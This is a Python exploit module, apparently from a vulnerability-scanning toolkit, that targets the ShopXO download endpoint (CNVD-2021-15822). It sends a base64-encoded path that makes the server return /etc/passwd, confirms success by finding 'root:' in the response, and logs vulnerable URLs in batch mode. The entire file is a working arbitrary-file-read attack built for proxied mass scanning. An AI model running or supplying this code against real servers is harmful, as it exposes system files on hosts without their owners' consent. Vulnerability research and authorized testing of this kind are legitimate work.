#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class Cnvd_2021_15822:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q='
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:" in req.text:
                OutPrintInfoSuc("ShopXO", f"存在ShopXO download 任意文件读取漏洞{url2}")
                if self.batch:
                    with open("./result/shopxo_2021_15822.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("ShopXO", "不存在ShopXO download 任意文件读取漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("ShopXO", "开始检测ShopXO download 任意文件读取漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("ShopXO", "ShopXO download 任意文件读取漏洞检测结束")
